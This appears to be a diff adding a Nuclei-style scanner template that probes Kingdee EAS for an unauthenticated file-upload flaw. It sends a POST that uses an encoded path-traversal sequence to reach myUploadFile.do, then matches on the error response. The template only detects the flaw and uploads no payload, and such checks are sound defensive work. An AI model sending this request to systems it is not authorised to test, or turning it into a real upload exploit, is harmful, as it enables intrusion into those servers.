@@ -1,0 +1,27 @@
+id: Kingdee-eas-myUploadFile-upload-poc
+
+info:
+  name: Kingdee-eas-myUploadFile-upload-poc
+  author: Kingdee-eas-myUploadFile-upload-poc
+  severity: critical
+
+requests:
+  - raw:
+      - |
+        POST /easportal/buffalo/%2e%2e/cm/myUploadFile.do HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Connection: close
+        Accept: */*
+        Accept-Language: en
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySq4lDnabv8CwHfvx
+        Accept-Encoding: gzip, deflate
+        Content-Length: 211
+
+        test
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==500 && contains(body,"内部服务器错误") && contains(all_headers,"Set-Cookie")'
